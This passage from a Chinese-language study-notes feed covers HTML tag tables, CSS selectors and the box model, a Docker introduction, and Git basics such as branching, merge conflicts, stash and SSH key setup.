</tr>
<tr>
<td><code>&lt;tfoot&gt;</code></td>
<td>定义表格的页脚</td>
</tr>
</tbody>
</table>
<h4 id="列表类标签" tabindex="-1"> 列表类标签</h4>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;ol&gt;</code></td>
<td>定义有序列表</td>
</tr>
<tr>
<td><code>&lt;ul&gt;</code></td>
<td>定义无序列表</td>
</tr>
<tr>
<td><code>&lt;li&gt;</code></td>
<td>定义列表项</td>
</tr>
<tr>
<td><code>&lt;dl&gt;</code></td>
<td>定义列表</td>
</tr>
<tr>
<td><code>&lt;dt&gt;</code></td>
<td>自定义列表项目</td>
</tr>
<tr>
<td><code>&lt;dd&gt;</code></td>
<td>定义自定列表项的描述</td>
</tr>
</tbody>
</table>
<h4 id="表单类标签" tabindex="-1"> 表单类标签</h4>
<p>表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p>
<p>表单使用表单标签 <code>&lt;form&gt;</code> 来设置</p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;form&gt;</code></td>
<td>定义供用户输入的表单</td>
</tr>
<tr>
<td><code>&lt;input&gt;</code></td>
<td>定义输入域</td>
</tr>
<tr>
<td><code>&lt;textarea&gt;</code></td>
<td>定义文本域 (一个多行的输入控件)</td>
</tr>
<tr>
<td><code>&lt;label&gt;</code></td>
<td>定义了 <code>&lt;input&gt;</code> 元素的标签，一般为输入标题</td>
</tr>
<tr>
<td><code>&lt;fieldset&gt;</code></td>
<td>定义了一组相关的表单元素，并使用外框包含起来</td>
</tr>
<tr>
<td><code>&lt;legend&gt;</code></td>
<td>定义了 <code>&lt;fieldset&gt;</code> 元素的标题</td>
</tr>
<tr>
<td><code>&lt;select&gt;</code></td>
<td>定义了下拉选项列表</td>
</tr>
<tr>
<td><code>&lt;optgroup&gt;</code></td>
<td>定义选项组</td>
</tr>
<tr>
<td><code>&lt;option&gt;</code></td>
<td>定义下拉列表中的选项</td>
</tr>
<tr>
<td><code>&lt;button&gt;</code></td>
<td>定义一个点击按钮</td>
</tr>
</tbody>
</table>
<h4 id="文本格式化标签" tabindex="-1"> 文本格式化标签</h4>
<p><strong>HTML 文本格式化标签</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;b&gt;</code></td>
<td>定义粗体文本</td>
</tr>
<tr>
<td><code>&lt;em&gt;</code></td>
<td>定义着重文字</td>
</tr>
<tr>
<td><code>&lt;i&gt;</code></td>
<td>定义斜体字</td>
</tr>
<tr>
<td><code>&lt;small&gt;</code></td>
<td>定义小号字</td>
</tr>
<tr>
<td><code>&lt;strong&gt;</code></td>
<td>定义加重语气</td>
</tr>
<tr>
<td><code>&lt;sub&gt;</code></td>
<td>定义下标字</td>
</tr>
<tr>
<td><code>&lt;sup&gt;</code></td>
<td>定义上标字</td>
</tr>
<tr>
<td><code>&lt;ins&gt;</code></td>
<td>定义插入字</td>
</tr>
<tr>
<td><code>&lt;del&gt;</code></td>
<td>定义删除字</td>
</tr>
</tbody>
</table>
<p><strong>计算机输出标签</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;code&gt;</code></td>
<td>定义计算机代码</td>
</tr>
<tr>
<td><code>&lt;kbd&gt;</code></td>
<td>定义键盘码</td>
</tr>
<tr>
<td><code>&lt;samp&gt;</code></td>
<td>定义计算机代码样本</td>
</tr>
<tr>
<td><code>&lt;var&gt;</code></td>
<td>定义变量</td>
</tr>
<tr>
<td><code>&lt;pre&gt;</code></td>
<td>定义预格式文本</td>
</tr>
</tbody>
</table>
<p><strong>引文, 引用, 及标签定义</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;abbr&gt;</code></td>
<td>定义缩写</td>
</tr>
<tr>
<td><code>&lt;address&gt;</code></td>
<td>定义地址</td>
</tr>
<tr>
<td><code>&lt;bdo&gt;</code></td>
<td>定义文字方向</td>
</tr>
<tr>
<td><code>&lt;blockquote&gt;</code></td>
<td>定义长的引用</td>
</tr>
<tr>
<td><code>&lt;q&gt;</code></td>
<td>定义短的引用语</td>
</tr>
<tr>
<td><code>&lt;cite&gt;</code></td>
<td>定义引用、引证</td>
</tr>
<tr>
<td><code>&lt;dfn&gt;</code></td>
<td>定义一个定义项目。</td>
</tr>
</tbody>
</table>
<h3 id="特点分类" tabindex="-1"> 特点分类</h3>
<h4 id="块级标签" tabindex="-1"> 块级标签</h4>
<p>块级元素是指本身属性为display:block;的元素。因为它自身的特点，我们通常使用块级元素来进行大布局（大结构）的搭建。</p>
<p><strong>特点</strong></p>
<ul>
<li>独占一行，每一个块级元素都会从新的一行重新开始，从上到下排布</li>
<li>可以直接控制宽度、高度以及盒子模型的相关css属性</li>
<li>在不设置宽度的情况下，块级元素的宽度是它父级元素内容的宽度</li>
<li>在不设置高度的情况下，块级元素的高度是它本身内容的高度</li>
</ul>
<p><strong>常用块级元素</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;h1&gt;</code>...<code>&lt;h6&gt;</code></td>
<td>定义标题，从h1到h6字体大小依次减小</td>
</tr>
<tr>
<td><code>&lt;p&gt;</code></td>
<td>段落标签</td>
</tr>
<tr>
<td><code>&lt;br&gt;</code></td>
<td>换行</td>
</tr>
<tr>
<td><code>&lt;hr&gt;</code></td>
<td>一条水平直线</td>
</tr>
<tr>
<td><code>&lt;div&gt;</code></td>
<td>定义文档中的各个结点</td>
</tr>
<tr>
<td><code>&lt;menu&gt;</code></td>
<td>菜单列表</td>
</tr>
<tr>
<td><code>&lt;ol&gt;</code></td>
<td>有序列表</td>
</tr>
<tr>
<td><code>&lt;ul&gt;</code></td>
<td>无序列表</td>
</tr>
<tr>
<td><code>&lt;li&gt;</code></td>
<td>列表项</td>
</tr>
<tr>
<td><code>&lt;dl&gt;</code></td>
<td>定义列表</td>
</tr>
<tr>
<td><code>&lt;dt&gt;</code></td>
<td>定义术语</td>
</tr>
<tr>
<td><code>&lt;dd&gt;</code></td>
<td>定义描述</td>
</tr>
<tr>
<td><code>&lt;table&gt;</code></td>
<td>表格</td>
</tr>
<tr>
<td><code>&lt;form&gt;</code></td>
<td>交互表单</td>
</tr>
</tbody>
</table>
<h4 id="行内标签-内联标签" tabindex="-1"> 行内标签(内联标签)</h4>
<p>内联元素是指本身属性为display:inline;的元素。因为它自身的特点，我们通常使用块级元素来进行文字、小图标（小结构）的搭建。</p>
<p><strong>特点</strong></p>
<ul>
<li>多个行内标签能同时显示在一行</li>
<li>不能直接控制宽度、高度以及盒子模型的相关css属性，但是直接设置内外边距的左右值是可以的</li>
<li>内联元素的宽高是由本身内容的大小决定（文字、图片等）</li>
<li>内联元素只能容纳文本或者其他内联元素（此处请注意，不要在内联元素中嵌套块级元素）</li>
</ul>
<p><strong>常用内联元素</strong></p>
<table>
<thead>
<tr>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>span</td>
<td>常用内联容器，定义文本内区块</td>
</tr>
<tr>
<td>a</td>
<td>锚点</td>
</tr>
</tbody>
</table>
<p>以及HTML文本格式化标签</p>
<h4 id="行内块元素" tabindex="-1"> 行内块元素</h4>
<p>行内块元素指本身属性为display: inline-block;的元素</p>
<p>特点</p>
<ul>
<li>不会自动换行</li>
<li>能够识别宽高</li>
<li>默认的排列顺序是从左至右</li>
</ul>
<h2 id="html-属性" tabindex="-1"> HTML 属性</h2>
<p>属性是 HTML 元素提供的附加信息</p>
<ul>
<li>HTML 元素可以设置属性</li>
<li>属性可以在元素中添加附加信息</li>
<li>属性一般描述于开始标签</li>
<li>属性总是以名称/值对的形式出现，比如：name=&quot;value&quot;。</li>
</ul>
<p>下面列出了适用于大多数 HTML 元素的属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>class</td>
<td>为html元素定义一个或多个类名（classname）(类名从样式文件引入)</td>
</tr>
<tr>
<td>id</td>
<td>定义元素的唯一id</td>
</tr>
<tr>
<td>style</td>
<td>规定元素的行内样式（inline style）</td>
</tr>
<tr>
<td>title</td>
<td>描述了元素的额外信息 (作为工具条使用)</td>
</tr>
<tr>
<td>accesskey</td>
<td>设置访问元素的键盘快捷键</td>
</tr>
</tbody>
</table>
<h1 id="css" tabindex="-1"> CSS</h1>
<h2 id="css-简介" tabindex="-1"> CSS 简介</h2>
<p><strong>CSS定义</strong></p>
<ul>
<li>CSS 指层叠样式表 (Cascading Style Sheets)</li>
<li>样式定义如何显示 HTML 元素</li>
<li>样式通常存储在样式表中</li>
<li>把样式添加到 HTML 4.0 中，是为了解决内容与表现分离的问题</li>
<li>外部样式表可以极大提高工作效率</li>
<li>外部样式表通常存储在 CSS 文件中</li>
<li>多个样式定义可层叠为一个</li>
</ul>
<p><strong>CSS分类</strong></p>
<ul>
<li>外部样式表</li>
<li>内联样式表</li>
<li>内联样式</li>
</ul>
<p><strong>多重样式优先级</strong>:
内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</p>
<h2 id="css-使用" tabindex="-1"> CSS 使用</h2>
<h3 id="css-选择器" tabindex="-1"> CSS 选择器</h3>
<p>id &gt; 标签 &gt; class</p>
<p><strong>id选择器</strong>:</p>
<ul>
<li>#标签的id属性值{样式名1：样式值1;……}</li>
<li>作用：给某个指定的标签添加指定的样式</li>
</ul>
<p><strong>标签选择器</strong>：</p>
<ul>
<li>标签名{样式名1：样式值1;……}</li>
<li>作用：会将当前网页内的所有该标签增加相同的样式</li>
</ul>
<p><strong>类选择器</strong>：</p>
<ul>
<li>.类选择器名{样式名1：样式值1;……}</li>
<li>作用：给不同的标签添加相同的样式</li>
</ul>
<p><strong>全部选择选择器</strong></p>
<ul>
<li>*{样式名1：样式值1;……}</li>
<li>作用：选择所有的HTML标签，并添加相同的样式</li>
</ul>
<p><strong>组合选择器</strong></p>
<ul>
<li>选择器1,选择器2,……{样式名1：样式值1;……}</li>
<li>作用：解决不同的选择器之间重复样式的问题</li>
</ul>
<p><strong>属性选择器</strong>：</p>
<ul>
<li>标签名[属性名=属性值]{样式名1：样式值1;……}</li>
<li>作用：选择某标签指定具备某属性并且属性值为某属性值的标签</li>
</ul>
<hr/>
<p><strong>层叠选择器</strong></p>
<ul>
<li>后代选择器(以空格分隔):用于选取某元素的后代元素</li>
<li>子元素选择器(以大于号分隔):只能选择作为某元素子元素的元素</li>
<li>相邻兄弟选择器（以加号分隔）:可选择紧接在另一元素后的元素，且二者有相同父元素。</li>
<li>普通兄弟选择器（以破折号~分隔）:选取所有指定元素之后的相邻兄弟元素</li>
</ul>
<h3 id="css-定位" tabindex="-1"> CSS 定位</h3>
<p>position 属性指定了元素的定位类型。</p>
<p>position 属性的五个值：</p>
<ul>
<li>static
<ul>
<li>HTML 元素的默认值，即没有定位，遵循正常的文档流对象。</li>
<li>静态定位的元素不会受到 top, bottom, left, right影响。</li>
</ul>
</li>
<li>relative
<ul>
<li>相对定位元素的定位是相对其正常位置。</li>
<li>相对定位元素经常被用来作为绝对定位元素的容器块。</li>
</ul>
</li>
<li>fixed
<ul>
<li>元素的位置相对于浏览器窗口是固定位置。</li>
<li>即使窗口是滚动的它也不会移动：</li>
</ul>
</li>
<li>absolute
<ul>
<li>绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于<code>&lt;html&gt;</code></li>
<li>absolute 定位使元素的位置与文档流无关，因此不占据空间。</li>
<li>absolute 定位的元素和其他元素重叠。</li>
</ul>
</li>
<li>sticky
<ul>
<li>基于用户的滚动位置来定位。</li>
<li>粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。</li>
</ul>
</li>
</ul>
<h3 id="盒子模型" tabindex="-1"> 盒子模型</h3>
<p>所有HTML元素可以看作盒子，在CSS中，&quot;box model&quot;这一术语是用来设计和布局时使用。</p>
<p>CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。</p>
<p>盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。</p>
<p><img src="@source/assets/cs-note/preface/basic/box-model.png" alt="" loading="lazy"></p>
<p>不同部分的说明：</p>
<ul>
<li>Margin(外边距) - 清除边框外的区域，外边距是透明的。</li>
<li>Border(边框) - 围绕在内边距和内容外的边框。</li>
<li>Padding(内边距) - 清除内容周围的区域，内边距是透明的。</li>
<li>Content(内容) - 盒子的内容，显示文本和图像。</li>
</ul>
<h3 id="常用样式" tabindex="-1"> 常用样式</h3>
<h4 id="css-background" tabindex="-1"> CSS Background</h4>
<table>
<thead>
<tr>
<th>Property</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>background</td>
<td>简写属性，作用是将背景属性设置在一个声明中。</td>
</tr>
<tr>
<td>background-attachment</td>
<td>背景图像是否固定或者随着页面的其余部分滚动。</td>
</tr>
<tr>
<td>background-color</td>
<td>设置元素的背景颜色。</td>
</tr>
<tr>
<td>background-image</td>
<td>把图像设置为背景。</td>
</tr>
<tr>
<td>background-position</td>
<td>设置背景图像的起始位置。</td>
</tr>
<tr>
<td>background-repeat</td>
<td>设置背景图像是否及如何重复。</td>
</tr>
</tbody>
</table>
<h4 id="css-text" tabindex="-1"> CSS Text</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>color</td>
<td>设置文本颜色</td>
</tr>
<tr>
<td>direction</td>
<td>设置文本方向。</td>
</tr>
<tr>
<td>letter-spacing</td>
<td>设置字符间距</td>
</tr>
<tr>
<td>line-height</td>
<td>设置行高</td>
</tr>
<tr>
<td>text-align</td>
<td>对齐元素中的文本</td>
</tr>
<tr>
<td>text-decoration</td>
<td>向文本添加修饰</td>
</tr>
<tr>
<td>text-indent</td>
<td>缩进元素中文本的首行</td>
</tr>
<tr>
<td>text-shadow</td>
<td>设置文本阴影</td>
</tr>
<tr>
<td>text-transform</td>
<td>控制元素中的字母</td>
</tr>
<tr>
<td>unicode-bidi</td>
<td>设置或返回文本是否被重写</td>
</tr>
<tr>
<td>vertical-align</td>
<td>设置元素的垂直对齐</td>
</tr>
<tr>
<td>white-space</td>
<td>设置元素中空白的处理方式</td>
</tr>
<tr>
<td>word-spacing</td>
<td>设置字间距</td>
</tr>
</tbody>
</table>
<h4 id="css-fonts" tabindex="-1"> CSS Fonts</h4>
<table>
<thead>
<tr>
<th>Property</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>font</td>
<td>在一个声明中设置所有的字体属性</td>
</tr>
<tr>
<td>font-family</td>
<td>指定文本的字体系列</td>
</tr>
<tr>
<td>font-size</td>
<td>指定文本的字体大小</td>
</tr>
<tr>
<td>font-style</td>
<td>指定文本的字体样式</td>
</tr>
<tr>
<td>font-variant</td>
<td>以小型大写字体或者正常字体显示文本。</td>
</tr>
<tr>
<td>font-weight</td>
<td>指定字体的粗细。</td>
</tr>
</tbody>
</table>
<h4 id="css-link" tabindex="-1"> CSS Link</h4>
<p>链接的样式，可以用任何CSS属性（如颜色，字体，背景等）。</p>
<p>特别的链接，可以有不同的样式，这取决于他们是什么状态。</p>
<p>这四个链接状态是：</p>
<ul>
<li>a:link - 正常，未访问过的链接</li>
<li>a:visited - 用户已访问过的链接</li>
<li>a:hover - 当用户鼠标放在链接上时</li>
<li>a:active - 链接被点击的那一刻</li>
</ul>
<h4 id="css列表" tabindex="-1"> CSS列表</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>list-style</td>
<td>简写属性。用于把所有用于列表的属性设置于一个声明中</td>
</tr>
<tr>
<td>list-style-image</td>
<td>将图象设置为列表项标志。</td>
</tr>
<tr>
<td>list-style-position</td>
<td>设置列表中列表项标志的位置。</td>
</tr>
<tr>
<td>list-style-type</td>
<td>设置列表项标志的类型。</td>
</tr>
</tbody>
</table>
<h1 id="javascript" tabindex="-1"> JavaScript</h1>
<h2 id="javascript-简介" tabindex="-1"> JavaScript 简介</h2>
<p>JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新。</p>
<p><strong>JavaScript语言的介绍</strong>：JavaScript是基于对象和原型的一种动态、弱类型的脚本语言</p>
<p><strong>JavaScript语言的组成</strong>：JavaScript是由核心语法(ECMAScript)、文档对象模型(DOM)、浏览器对象模型(BOM)组成的</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、解决的问题</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Docker.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Docker.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="一、解决的问题" tabindex="-1"> 一、解决的问题</h1>
<p>由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。</p>
<p>Docker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/011f3ef6-d824-4d43-8b2c-36dab8eaaa72-1.png" width="400px"/> </div><br>
<h1 id="二、与虚拟机的比较" tabindex="-1"> 二、与虚拟机的比较</h1>
<p>虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/be608a77-7b7f-4f8e-87cc-f2237270bf69.png" width="500"/> </div><br>
<h2 id="启动速度" tabindex="-1"> 启动速度</h2>
<p>启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢；</p>
<p>而启动 Docker 相当于启动宿主操作系统上的一个进程。</p>
<h2 id="占用资源" tabindex="-1"> 占用资源</h2>
<p>虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。</p>
<p>而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。</p>
<h1 id="三、优势" tabindex="-1"> 三、优势</h1>
<p>除了启动速度快以及占用资源少之外，Docker 具有以下优势：</p>
<h2 id="更容易迁移" tabindex="-1"> 更容易迁移</h2>
<p>提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。</p>
<h2 id="更容易维护" tabindex="-1"> 更容易维护</h2>
<p>使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。</p>
<h2 id="更容易扩展" tabindex="-1"> 更容易扩展</h2>
<p>可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。</p>
<h1 id="四、使用场景" tabindex="-1"> 四、使用场景</h1>
<h2 id="持续集成" tabindex="-1"> 持续集成</h2>
<p>持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。</p>
<p>Docker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。</p>
<h2 id="提供可伸缩的云服务" tabindex="-1"> 提供可伸缩的云服务</h2>
<p>根据应用的负载情况，可以很容易地增加或者减少 Docker。</p>
<h2 id="搭建微服务架构" tabindex="-1"> 搭建微服务架构</h2>
<p>Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。</p>
<h1 id="五、镜像与容器" tabindex="-1"> 五、镜像与容器</h1>
<p>镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。</p>
<p>镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。</p>
<p>构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/docker-filesystems-busyboxrw.png"/> </div><br>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li><a href="https://blog.docker.com/2017/08/docker-101-introduction-docker-webinar-recap/" target="_blank" rel="noopener noreferrer">DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener noreferrer">Docker 入门教程</a></li>
<li><a href="http://www.bogotobogo.com/DevOps/Docker/Docker_Container_vs_Virtual_Machine.php" target="_blank" rel="noopener noreferrer">Docker container vs Virtual machine</a></li>
<li><a href="https://linoxide.com/linux-how-to/dockerfile-create-docker-container/" target="_blank" rel="noopener noreferrer">How to Create Docker Container using Dockerfile</a></li>
<li><a href="http://www.cnblogs.com/sammyliu/p/5877964.html" target="_blank" rel="noopener noreferrer">理解 Docker（2）：Docker 镜像</a></li>
<li><a href="https://yeasy.gitbooks.io/docker_practice/introduction/why.html" target="_blank" rel="noopener noreferrer">为什么要使用 Docker？</a></li>
<li><a href="https://www.docker.com/what-docker" target="_blank" rel="noopener noreferrer">What is Docker</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/09/continuous-integration.html" target="_blank" rel="noopener noreferrer">持续集成是什么？</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">集中式与分布式</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Git.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Git.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="集中式与分布式" tabindex="-1"> 集中式与分布式</h1>
<p>Git 属于分布式版本控制系统，而 SVN 属于集中式。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png" width="600px"> </div><br>
<p>集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。</p>
<p>集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。</p>
<p>集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。</p>
<p>分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。</p>
<h1 id="中心服务器" tabindex="-1"> 中心服务器</h1>
<p>中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。</p>
<p>Github 就是一个中心服务器。</p>
<h1 id="工作流" tabindex="-1"> 工作流</h1>
<p>新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。</p>
<p>Git 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 存储所有分支信息，使用一个 HEAD 指针指向当前分支。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/71b97a50-a49f-4f1a-81d1-48c3364d61b3.png" width="700px"> </div><br>
<ul>
<li>git add files 把文件的修改添加到暂存区</li>
<li>git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了</li>
<li>git reset -- files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files</li>
<li>git checkout -- files 使用暂存区的修改覆盖工作目录，用来撤销本地修改</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72ee7e9a-194d-42e9-b4d7-29c23417ca18.png" width="320px"> </div><br>
<p>可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。</p>
<ul>
<li>git commit -a 直接把所有文件的修改添加到暂存区然后执行提交</li>
<li>git checkout HEAD -- files 取出最后一次修改，可以用来进行回滚操作</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a4a0a6e6-386b-4bfa-b899-ec33d3310f3e.png" width="500px"> </div><br>
<h1 id="分支实现" tabindex="-1"> 分支实现</h1>
<p>使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ec4d7464-7140-46d8-827e-d63634202e1e.png" width="220px"> </div><br>
<p>新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支，表示新分支成为当前分支。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66d00642-ce37-466c-8f7a-143d0bf84cd6.png" width="220px"> </div><br>
<p>每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72a01242-e6b4-46c5-a285-24e754d63093.png" width="300px"> </div><br>
<p>合并分支也只需要改变指针即可。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/94617147-0cbd-4a28-847d-81e52efb1b1e.png" width="300px"> </div><br>
<h1 id="冲突" tabindex="-1"> 冲突</h1>
<p>当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/32b05e81-41b3-414a-8656-736c9604e3d6.png" width="300px"> </div><br>
<p>Git 会使用 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ，======= ，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。</p>
<div><pre><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
Creating a new branch is quick &amp; simple.
=======
Creating a new branch is quick AND simple.
>>>>>>> feature1
</code></pre></div><h1 id="fast-forward" tabindex="-1"> Fast forward</h1>
<p>&quot;快进式合并&quot;（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。</p>
<p>可以在合并时加上 --no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。</p>
<div><pre><code>$ git merge --no-ff -m "merge with no-ff" dev
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9a519773-84b2-4c81-81cf-4e7dd739a97a.png" width="350px"> </div><br>
<h1 id="分支管理策略" tabindex="-1"> 分支管理策略</h1>
<p>master 分支应该是非常稳定的，只用来发布新版本；</p>
<p>日常开发在开发分支 dev 上进行。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/245fd2fb-209c-4ad5-bc5e-eb5664966a0e.jpg" width=""> </div><br>
<h1 id="储藏-stashing" tabindex="-1"> 储藏（Stashing）</h1>
<p>在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。</p>
<p>可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈中，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。</p>
<div><pre><code>$ git stash
Saved working directory and index state \ "WIP on master: 049d078 added the index file"
HEAD is now at 049d078 added the index file (To restore them type "git stash apply")
</code></pre></div><p>该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。</p>
<h1 id="ssh-传输设置" tabindex="-1"> SSH 传输设置</h1>
<p>Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。</p>
<p>如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key：</p>
<div><pre><code>$ ssh-keygen -t rsa -C "youremail@example.com"
</code></pre></div><p>然后把公钥 id_rsa.pub 的内容复制到 Github &quot;Account settings&quot; 的 SSH Keys 中。</p>
<h1 id="gitignore-文件" tabindex="-1"> .gitignore 文件</h1>
<p>忽略以下文件：</p>
<ul>
<li>操作系统自动生成的文件，比如缩略图；</li>
<li>编译生成的中间文件，比如 Java 编译产生的 .class 文件；</li>
<li>自己的敏感信息，比如存放口令的配置文件。</li>
</ul>
